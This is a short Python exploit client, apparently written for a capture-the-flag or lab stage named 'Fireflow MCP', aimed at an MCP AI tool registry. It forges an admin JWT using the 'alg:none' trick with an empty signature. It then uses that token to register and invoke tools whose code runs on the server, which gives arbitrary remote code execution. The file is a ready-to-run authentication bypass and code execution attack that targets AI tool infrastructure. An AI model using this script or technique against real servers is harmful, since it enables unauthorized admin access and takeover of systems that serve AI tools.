#!/usr/bin/env python3
"""
MCP AI Tool Registry client (Fireflow MCP stage).

Forges an admin JWT with alg:none (the server accepts literal lowercase
"none" with an empty-but-present signature), then registers and calls tools.
Tool `code` is executed server-side and the server captures STDOUT, so tools
print() their output; it comes back in result.content[0].text.

Usage:
  python3 mcp_client.py register <tool_name> <path-to-code.py>
  python3 mcp_client.py call <tool_name> ['<json-args>']

Set BASE to the MCP NodePort. <bot> is the service-account username from
~/.mcp/config.json (the JWT `sub`).
"""
import sys, json, base64, urllib.request, urllib.error

BASE = "http://<target>:30080"
BOT  = "<bot>"


def b64(d: bytes) -> str:
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()


def admin_token() -> str:
    h = b64(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64(json.dumps({"sub": BOT, "role": "admin"}, separators=(",", ":")).encode())
    return f"{h}.{p}."          # empty-but-present signature; note the trailing dot


HDRS = {"Content-Type": "application/json",
        "Authorization": f"Bearer {admin_token()}"}


def post(path: str, body: dict):
    req = urllib.request.Request(BASE + path, data=json.dumps(body).encode(),
                                 method="POST", headers=HDRS)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def register(name: str, code: str):
    return post("/api/v1/tools", {"name": name, "description": "x", "code": code,
                                  "inputSchema": {"type": "object", "properties": {}}})


def call(name: str, args: dict):
    return post("/mcp", {"jsonrpc": "2.0", "id": 99, "method": "tools/call",
                         "params": {"name": name, "arguments": args}})


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(__doc__)
        sys.exit(1)
    cmd = sys.argv[1]
    if cmd == "register":
        print(register(sys.argv[2], open(sys.argv[3]).read()))
    elif cmd == "call":
        args = json.loads(sys.argv[3]) if len(sys.argv) > 3 else {}
        print(call(sys.argv[2], args))
    else:
        print(__doc__)
